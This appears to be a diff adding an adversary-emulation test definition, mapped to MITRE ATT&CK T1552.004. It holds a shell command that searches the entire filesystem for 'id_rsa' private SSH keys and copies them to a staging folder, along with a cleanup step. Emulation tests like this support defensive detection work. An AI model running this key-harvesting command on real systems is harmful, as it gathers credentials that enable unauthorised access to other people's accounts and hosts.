@@ -1,0 +1,17 @@
+- description: 'Copy private SSH keys on a FreeBSD system to a staging folder using
+    the `cp` command.
+
+    '
+  id: cc0bcc0f51743819f1a88c579596cfb9
+  name: Copy Private SSH Keys with CP (freebsd)
+  platforms:
+    linux:
+      sh:
+        cleanup: rm -rf /tmp/art-staging
+        command: mkdir /tmp/art-staging; find / -name id_rsa 2>/dev/null -exec gcp
+          --parents {} /tmp/art-staging \;
+        payloads: []
+  tactic: credential-access
+  technique:
+    attack_id: T1552.004
+    name: 'Unsecured Credentials: Private Keys'
